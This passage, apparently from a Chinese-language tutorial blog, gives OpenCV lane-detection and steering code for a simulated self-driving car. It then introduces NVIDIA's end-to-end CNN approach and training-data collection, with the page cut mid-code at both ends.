class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">detect_line</span>(<span class="params">edges</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    基于霍夫变换的直线检测</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    rho = <span class="number">1</span>  <span class="comment"># 距离精度：1像素</span></span><br><span class="line">    angle = np.pi / <span class="number">180</span>  <span class="comment"># 角度精度：1度</span></span><br><span class="line">    min_thr = <span class="number">10</span>  <span class="comment"># 最少投票数</span></span><br><span class="line">    lines = cv2.HoughLinesP(edges,rho, angle,min_thr,np.array([]),minLineLength=<span class="number">8</span>,maxLineGap=<span class="number">8</span>)</span><br><span class="line">    <span class="keyword">return</span> lines</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">average_lines</span>(<span class="params">frame, lines, direction=<span class="string">&#x27;left&#x27;</span></span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    小线段聚类</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    lane_lines = []</span><br><span class="line">    <span class="keyword">if</span> lines <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(direction + <span class="string">&#x27;没有检测到线段&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> lane_lines</span><br><span class="line">    <span class="comment">#height, width , _= frame.shape</span></span><br><span class="line">    fits = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="keyword">for</span> x1, y1, x2, y2 <span class="keyword">in</span> line:</span><br><span class="line">            <span class="keyword">if</span> x1 == x2:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># 计算拟合直线</span></span><br><span class="line">            fit = np.polyfit((x1, x2), (y1, y2), <span class="number">1</span>)</span><br><span class="line">            slope = fit[<span class="number">0</span>]</span><br><span class="line">            intercept = fit[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> direction == <span class="string">&#x27;left&#x27;</span> <span class="keyword">and</span> slope &lt; <span class="number">0</span>:</span><br><span class="line">                fits.append((slope, intercept))</span><br><span class="line">            <span class="keyword">elif</span> direction == <span class="string">&#x27;right&#x27;</span> <span class="keyword">and</span> slope &gt; <span class="number">0</span>:</span><br><span class="line">                fits.append((slope, intercept))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(fits) &gt; <span class="number">0</span>:</span><br><span class="line">        fit_average = np.average(fits, axis=<span class="number">0</span>)</span><br><span class="line">        lane_lines.append(make_points(frame, fit_average))</span><br><span class="line">    <span class="keyword">return</span> lane_lines</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_points</span>(<span class="params">frame, line</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    根据直线斜率和截距计算线段起始坐标</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    height, width, _ = frame.shape</span><br><span class="line">    slope, intercept = line</span><br><span class="line">    y1 = height</span><br><span class="line">    y2 = <span class="built_in">int</span>(y1 * <span class="number">1</span> / <span class="number">2</span>)</span><br><span class="line">    x1 = <span class="built_in">max</span>(-width, <span class="built_in">min</span>(<span class="number">2</span> * width, <span class="built_in">int</span>((y1 - intercept) / slope)))</span><br><span class="line">    x2 = <span class="built_in">max</span>(-width, <span class="built_in">min</span>(<span class="number">2</span> * width, <span class="built_in">int</span>((y2 - intercept) / slope)))</span><br><span class="line">    <span class="keyword">return</span> [[x1, y1, x2, y2]]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">display_line</span>(<span class="params">frame, lines, line_color=(<span class="params"><span class="number">0</span>,<span class="number">0</span>,<span class="number">255</span></span>), line_width=<span class="number">2</span></span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    在原图上展示线段</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    line_img = np.zeros_like(frame)</span><br><span class="line">    <span class="keyword">if</span> lines <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">            <span class="keyword">for</span> x1, y1, x2, y2 <span class="keyword">in</span> line:</span><br><span class="line">                cv2.line(line_img, (x1, y1), (x2, y2), line_color, line_width)</span><br><span class="line">    line_img = cv2.addWeighted(frame, <span class="number">0.8</span>, line_img, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> line_img</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    yimg = cv2.imread(<span class="string">&#x27;yellow_edge_new.jpg&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">    wimg = cv2.imread(<span class="string">&#x27;white_edge_new.jpg&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">    <span class="comment">#霍夫变换</span></span><br><span class="line">    yimg_detect_line = detect_line(yimg)</span><br><span class="line">    wimg_detect_line = detect_line(wimg)</span><br><span class="line">    <span class="comment">#小线段聚类</span></span><br><span class="line">    yimg_average_lines = average_lines(yimg,yimg_detect_line,direction=<span class="string">&#x27;right&#x27;</span>)</span><br><span class="line">    wimg_average_lines = average_lines(wimg,wimg_detect_line)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#在原图上展示线段</span></span><br><span class="line">    y=cv2.imread(<span class="string">&#x27;test.jpg&#x27;</span>)</span><br><span class="line">    w=cv2.imread(<span class="string">&#x27;test.jpg&#x27;</span>)</span><br><span class="line">    yellow_display_line = display_line(y, yimg_average_lines)</span><br><span class="line">    white_display_line = display_line(w, wimg_average_lines)</span><br><span class="line">    cv2.imwrite(<span class="string">&#x27;yellow_display_line.jpg&#x27;</span>, yellow_display_line)</span><br><span class="line">    cv2.imwrite(<span class="string">&#x27;white_display_line.jpg&#x27;</span>, white_display_line)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">region_of_interest</span>(<span class="params">edges, color=<span class="string">&#x27;yellow&#x27;</span></span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        感兴趣区域提取</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        height, width = edges.shape</span><br><span class="line">        mask = np.zeros_like(edges)</span><br><span class="line">        <span class="comment"># 定义感兴趣区域掩码轮廓</span></span><br><span class="line">        <span class="keyword">if</span> color == <span class="string">&#x27;yellow&#x27;</span>:</span><br><span class="line">            polygon = np.array([[(width * <span class="number">1</span> / <span class="number">2</span>, height * <span class="number">1</span> / <span class="number">2</span>),</span><br><span class="line">                                 (width, height * <span class="number">1</span> / <span class="number">2</span>),</span><br><span class="line">                                 (width, height),</span><br><span class="line">                                 (width * <span class="number">1</span> / <span class="number">2</span>, height)]], np.int32)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            polygon = np.array([[(<span class="number">0</span>, height * <span class="number">1</span> / <span class="number">2</span>),</span><br><span class="line">                                 (width * <span class="number">1</span> / <span class="number">2</span>, height * <span class="number">1</span> / <span class="number">2</span>),</span><br><span class="line">                                 (width * <span class="number">1</span> / <span class="number">2</span>, height),</span><br><span class="line">                                 (<span class="number">0</span>, height)]], np.int32)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 填充感兴趣区域掩码</span></span><br><span class="line">        cv2.fillPoly(mask, polygon, (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line">        <span class="comment"># 提取感兴趣区域</span></span><br><span class="line">        croped_edge = cv2.bitwise_and(edges, mask)</span><br><span class="line">        <span class="keyword">return</span> croped_edge</span><br></pre></td></tr></table></figure><p>再编写主函数入口：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入系统库</span></span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> gym</span><br><span class="line"><span class="keyword">import</span> gym_donkeycar</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入自定义库</span></span><br><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> region_of_interest, detect_line, make_points, average_lines, display_line</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    主函数</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># 设置模拟器环境</span></span><br><span class="line">    env = gym.make(<span class="string">&quot;donkey-generated-roads-v0&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 重置当前场景</span></span><br><span class="line">    obv = env.reset()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 开始启动</span></span><br><span class="line">    action = np.array([<span class="number">0</span>, <span class="number">1</span>])  <span class="comment"># 动作控制，第1个转向值，第2个油门值</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 执行动作</span></span><br><span class="line">    obv, reward, done, info = env.step(action)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取图像</span></span><br><span class="line">    frame = cv2.cvtColor(obv, cv2.COLOR_RGB2BGR)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 运行1000次动作</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        <span class="comment"># 转换图像到HSV空间</span></span><br><span class="line">        height, width, _ = frame.shape</span><br><span class="line">        hsv = cv2.cvtColor(frame, cv2.COLOR_BGR2HSV)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 黄色区域检测</span></span><br><span class="line">        lower_blue = np.array([<span class="number">15</span>, <span class="number">40</span>, <span class="number">40</span>])</span><br><span class="line">        upper_blue = np.array([<span class="number">45</span>, <span class="number">255</span>, <span class="number">255</span>])</span><br><span class="line">        yellow_mask = cv2.inRange(hsv, lower_blue, upper_blue)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 白色区域检测</span></span><br><span class="line">        lower_blue = np.array([<span class="number">0</span>, <span class="number">0</span>, <span class="number">200</span>])</span><br><span class="line">        upper_blue = np.array([<span class="number">180</span>, <span class="number">30</span>, <span class="number">255</span>])</span><br><span class="line">        white_mask = cv2.inRange(hsv, lower_blue, upper_blue)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 黄色线边缘提取</span></span><br><span class="line">        yellow_edge = cv2.Canny(yellow_mask, <span class="number">200</span>, <span class="number">400</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 白色线边缘提取</span></span><br><span class="line">        white_edge = cv2.Canny(white_mask, <span class="number">200</span>, <span class="number">400</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 黄色线感兴趣区域提取</span></span><br><span class="line">        yellow_roi = region_of_interest(yellow_edge, color=<span class="string">&#x27;yellow&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 白色线感兴趣区域提取</span></span><br><span class="line">        white_roi = region_of_interest(white_edge, color=<span class="string">&#x27;white&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 黄色线段检测</span></span><br><span class="line">        yellow_lines = detect_line(yellow_roi)</span><br><span class="line">        yellow_lane = average_lines(frame, yellow_lines, direction=<span class="string">&#x27;right&#x27;</span>)</span><br><span class="line">        <span class="comment"># yellow_show = display_line(frame, yellow_lane)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 白色线段检测</span></span><br><span class="line">        white_lines = detect_line(white_roi)</span><br><span class="line">        white_lane = average_lines(frame, white_lines, direction=<span class="string">&#x27;left&#x27;</span>)</span><br><span class="line">        <span class="comment"># white_show = display_line(frame, white_lane, line_color=(255, 0, 0))</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 计算转向角</span></span><br><span class="line">        x_offset = <span class="number">0</span></span><br><span class="line">        y_offset = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(yellow_lane) &gt; <span class="number">0</span> <span class="keyword">and</span> <span class="built_in">len</span>(white_lane) &gt; <span class="number">0</span>:  <span class="comment"># 检测到2条线</span></span><br><span class="line">            _, _, left_x2, _ = yellow_lane[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">            _, _, right_x2, _ = white_lane[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">            mid = <span class="built_in">int</span>(width / <span class="number">2</span>)</span><br><span class="line">            x_offset = (left_x2 + right_x2) / <span class="number">2</span> - mid</span><br><span class="line">            y_offset = <span class="built_in">int</span>(height / <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">len</span>(yellow_lane) &gt; <span class="number">0</span> <span class="keyword">and</span> <span class="built_in">len</span>(yellow_lane[<span class="number">0</span>]) == <span class="number">1</span>:  <span class="comment"># 只检测到黄色行道线</span></span><br><span class="line">            x1, _, x2, _ = yellow_lane[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">            x_offset = x2 - x1</span><br><span class="line">            y_offset = <span class="built_in">int</span>(height / <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">len</span>(white_lane) &gt; <span class="number">0</span> <span class="keyword">and</span> <span class="built_in">len</span>(white_lane[<span class="number">0</span>]) == <span class="number">1</span>:  <span class="comment"># 只检测到白色行道线</span></span><br><span class="line">            x1, _, x2, _ = white_lane[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">            x_offset = x2 - x1</span><br><span class="line">            y_offset = <span class="built_in">int</span>(height / <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">else</span>:  <span class="comment"># 一条线都没检测到</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;检测不到行道线，退出程序&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        angle_to_mid_radian = math.atan(x_offset / y_offset)</span><br><span class="line">        angle_to_mid_deg = <span class="built_in">int</span>(angle_to_mid_radian * <span class="number">180.0</span> / math.pi)</span><br><span class="line">        steering_angle = angle_to_mid_deg / <span class="number">45.0</span></span><br><span class="line">        action = np.array([steering_angle, <span class="number">0.3</span>])  <span class="comment"># 油门值恒定</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 执行动作</span></span><br><span class="line">        obv, reward, done, info = env.step(action)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 重新获取图像</span></span><br><span class="line">        frame = cv2.cvtColor(obv, cv2.COLOR_RGB2BGR)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 运行完以后重置当前场景</span></span><br><span class="line">    obv = env.reset()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    主函数入口</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>别忘了要先启动模拟器噢！</p><p>到这里本节就已经接近尾声了。我对代码中的很多部分进行了修改，使它适应新版的opencv与实际情况。每一部分都重新编写了完整的测试代码。<strong>跳到这里没看的同学至少把测试代码运行一下，尝试理解原理。</strong></p><p>注意：如果当前生成的赛道有“十字路口交叉”（每次重新进入赛道其生成的赛道都是随机绘制的），那么在运行的时候可能会出现失败、跑出赛道的现象。因为这种十字路口我们在程序中没有考虑。如何规避这个问题，有兴趣的同学可以自行研究。</p><p>本文更多的关注基于深度学习的图像处理技术，对于传统的图像处理算法（例如霍夫变换等）本文不再深入分析，同学们如果对这些传统图像处理算法不熟悉的可以自行再查阅资料深入研究，上面已经给出了不少资料的链接。</p><p>截止到目前为止，我们借助上面这个基于opencv的自动驾驶模拟平台，我们重新巩固了Python、opencv图像处理的基本使用方法，了解了自动驾驶项目的难点，对整个处理流程有了更进一步的认识。需要说明的是，尽管我们上述操作步骤是针对我们这个自动驾驶模拟平台的，但是以上步骤同样适用于很多其他图像处理任务，很多传统的图像处理任务都涵盖颜色空间变换、特定颜色物体提取、感兴趣区域过滤、霍夫变换等步骤，因此掌握上述常规的图像处理技术是非常重要的。</p><h2 id="3-基于深度学习的自动驾驶控制"><a href="#3-基于深度学习的自动驾驶控制" class="headerlink" title="3.基于深度学习的自动驾驶控制"></a>3.基于深度学习的自动驾驶控制</h2><p>在上一节中我们通过OpenCV图像处理技术实现了一个简易的自动驾驶小车。但是很明显，这辆自动驾驶小车的适应性很差，当图像中有相同颜色的干扰物出现时，那么对于这辆自动驾驶的小车来说就是顶级灾难。另外，我们需要大量人工定义的参数，例如行道线颜色（黄色或白色）、颜色阈值、霍夫变换阈值等，而且一旦地图环境换了，所有这些参数我们都得重新手工调整，这些参数之间又有一定的耦合性，参数调整很麻烦。很显然，这种处理方法普适性不好。</p><p>那么能不能丢给机器一大堆图片，让机器自己去学习如何从当前图像中分析出小车应该转向的合适角度？如果没有接触过深度学习，那么乍一听这个想法简直是天方夜谭，然而深度学习确实做到了。这就是为什么近十年深度学习在图像处理领域取得了全面成功。深度学习能够从大量图像数据中自行学习高层次语义特征，完成媲美人类甚至超越人类的推理水平，整个学习过程不用人为干预，我们要做的就是“喂”一堆图片并且设定好需要优化的目标函数即可。当我们“喂”的图片越多、种类越丰富，那么最终机器学习到的驾驶水平越强，而且适应性越好。</p><p>本小节开始我们将正式进入基于深度学习的自动驾驶领域。</p><h3 id="3-0一些基础知识"><a href="#3-0一些基础知识" class="headerlink" title="3.0一些基础知识"></a>3.0一些基础知识</h3><p>根据后面要用到的网络，这里放上一些基础知识，篇幅都不(太)长，请同学们阅读。</p><p><a href="https://zhuanlan.zhihu.com/p/243050824">神经网络与深度学习</a> 这种基本的认识想必大家已经有了，但这里还是放一放。</p><p><a href="https://www.bilibili.com/video/BV1hE411t7RN?share_source=copy_web">pytorch基础教程</a> pytorch可以使用英伟达NVIDIA的产品进行GPU运算，但AMD锐龙的显卡并不支持。教程后期有教到如何使用。这是非常浅显易懂的课(用张老师的话来说就是傻瓜式的)，因此虽然我们主要用到的是pytorch但这里不进行教学。如果仍有困难，后面我会现场讲解或录视频，加上写文档的方式帮助同学们。</p><p><a href="https://blog.csdn.net/fanxin_i/article/details/80212906">bp神经网络原理</a> bp神经网络我在导论课上讲的那个就是，忘了的话可以去导论那个群下载对应的excel演示下来玩一下。对应的论文也是非常有趣，预训练现在的应用非常广泛，同学们可以阅读一下。</p><p><a href="https://zhuanlan.zhihu.com/p/47184529">卷积神经网络与池化、全连接、归一化</a></p><p><a href="https://zhuanlan.zhihu.com/p/112993440">全连接神经网络</a></p><p><a href="https://zhuanlan.zhihu.com/p/424518359">归一化</a></p><p><a href="https://www.zhihu.com/question/51435499">端到端是什么</a></p><p>同时建议大家复习一下我当时给大家讲python的时候说到的os库。</p><h3 id="3-1算法原理"><a href="#3-1算法原理" class="headerlink" title="3.1算法原理"></a>3.1算法原理</h3><p>本项目实现思路参考2016年英伟达发表的论文《End to End Learning for Self-Driving Cars》。这篇文章提出的方法核心思想就是使用神经网络自动提取图像特征，从传统的 image -&gt; features -&gt; action变成了image -&gt; action。该论文使用了深度网络结构，大大增强了图像特征提取能力，最终取得了不错的效果，其训练的模型不论是普通道路还是高速路，不论有道路标线还是没有道路标线都非常有效，解决了传统算法泛化性能差的问题。本文方法的测试性能非常好，在16年自动驾驶研究火热时，是一篇影响力很大的文章，即使放到现在，也是作为自动驾驶入门必读的Paper。</p><p>整个算法原理很简单，是对真实人类操作的一个模拟。对于我们人类驾驶员来说，假设我们正在驾驶这辆车，我们的执行流程跟上面算法也是一样的。首先我们用眼睛观看路面，然后我们的大脑根据当前眼睛看到的路面情况“下意识”的转动方向盘，转动一个我们认为合适的角度，从而避免车辆开出路面。这篇论文算法实现原理也是这样，具体如下图所示：</p><p><img src="/.io//essay1.png"></p><p>通过中间摄像头采集图像，然后图像输入到预先训练好的CNN网络，这个网络的输出是一个转向角度（可以理解为方向盘的转向角度），有了这个角度就可以控制小车按照这个角度进行转向。</p><p>有了这样一个模式，我们就只需要想办法训练这个CNN模型，针对每帧图像，都有一个我们认为合适的转向角度输出，即输入图像，输出一个回归值。具体模型结构如下图所示：<br><img src="/.io//essay2.png"></p><p>整个模型结构并不复杂，就是一堆的普通的CNN卷积神经网络模块按照顺序堆叠，最后使用全连接网络输出回归值。这个模型一共包含30层，由于其输入精度比较低(66x200)，因此推理速度也是比较快的，借助GPU可以实现实时推理。具体的，图像首先经过Normalization标准化，然后经过5组卷积层处理，最后拉平以后通过4个全连接层输出一个回归值，这个回归值就是我们项目中的转向角。</p><p>这里我们会遇到一个问题，训练上述深度神经网络我们需要大量的数据，即每帧图像以及对应的最佳转向值，这些数据怎么来呢？这篇论文里提出了一个方法，既然是模拟人类行为，那么只要让驾驶水平高超的“老司机”在相关赛道上进行手动驾驶，驾驶时一边记录每帧图像同时记录当前帧对应的操控的转向角，这样一组组数据记录下来就是我们认为的“最佳”训练数据。训练时，将模型预测的角度与给定图像帧的期望转向角度进行比较，误差通过反向传播反馈到CNN训练过程中，如下图所示。从图可以看出，这个过程在一个循环中重复，直到误差（本例中使用均方误差）足够低，这意味着模型已经学会了如何合理地转向。事实上，这是一个非常典型的图像分类训练过程，只不过这里预测输出是数值（回归值）而不是对象类别（分类概率）。<br> 可以想象，如果能够完全的训练好这个模型，那么最终模型的输出结果是非常接近人类驾驶经验的。这篇论文通过大量实验证明，上述模型能够直接从拍摄的路面图像中有效的学习到最终的转向角，省去了传统算法颜色区域检测、感兴趣区域选择、霍夫变换等一系列复杂的耦合步骤。这篇论文做了一组实验，通过收集不到一百小时的少量训练数据进行训练，最后得到的模型足以支持在各种条件下操控车辆，比如高速公路、普通公路和居民区道路，以及晴天、多云和雨天等天气状况。</p><p>需要说明的是，这个模型的输出仅有一个转向角度，这样容易学习成功。如果输出变量再多一些（例如油门值、摄像头角度、行人避障等），那么这个模型还需要再进一步优化，感兴趣的同学可以借鉴近两年的论文进行深入研究（而我们的项目就是要做这个）。<br>接下来我们就按照这个算法流程进行实现。</p><p>###3.2数据采集</p><p>针对我们采用的自动驾驶模拟平台，为了能够采集到每帧图像及对应的最佳转向角度，我们可以使用前面第2节方法编写控制代码通过键盘控制小车（低匀速运行，仅仅只需要控制转向角度），然后记录每帧数据即可。这种模式是真实自动驾驶使用的，但是需要我们自己把自己练成经验充足的“老司机”，然后再去教会算法怎么驾驶。这样比较麻烦，这里可以有一种“偷懒”的办法。我们使用前面调参调的不错的OpenCV自动驾驶版本，使用OpenCV算法自动驾驶，然后记录每帧图像及对应角度。尽管这个OpenCV自动驾驶水平本身也一般（没有一直控制在两条行道线的绝对正中间），但是胜在能够基本稳定在行道线内。本文只是一个自动驾驶入门项目，可以采用这样的方法收集数据，来快速验证深度学习自动驾驶可行性。真实项目的话还是需要向“老司机”学习的。</p><p>先定义自定义tools库，这里对上面的进行了一定的修改。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">region_of_interest</span>(<span class="params">edges, color=<span class="string">&#x27;yellow&#x27;</span></span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    感兴趣区域提取</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    height, width = edges.shape</span><br><span class="line">    mask = np.zeros_like(edges)</span><br><span class="line">    <span class="comment"># 定义感兴趣区域掩码轮廓</span></span><br><span class="line">    <span class="keyword">if</span> color == <span class="string">&#x27;yellow&#x27;</span>:</span><br><span class="line">        polygon = np.array([[(<span class="number">0</span>, height * <span class="number">1</span> / <span class="number">2</span>),</span><br><span class="line">                             (width * <span class="number">1</span> / <span class="number">2</span>, height * <span class="number">1</span> / <span class="number">2</span>),</span><br><span class="line">                             (width * <span class="number">1</span> / <span class="number">2</span>, height),</span><br><span class="line">                             (<span class="number">0</span>, height)]], np.int32)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        polygon = np.array([[(width * <span class="number">1</span> / <span class="number">2</span>, height * <span class="number">1</span> / <span class="number">2</span>),</span><br><span class="line">                             (width, height * <span class="number">1</span> / <span class="number">2</span>),</span><br><span class="line">                             (width, height),</span><br><span class="line">                             (width * <span class="number">1</span> / <span class="number">2</span>, height)]], np.int32)</span><br><span class="line">    <span class="comment"># 填充感兴趣区域掩码</span></span><br><span class="line">    cv2.fillPoly(mask, polygon, <span 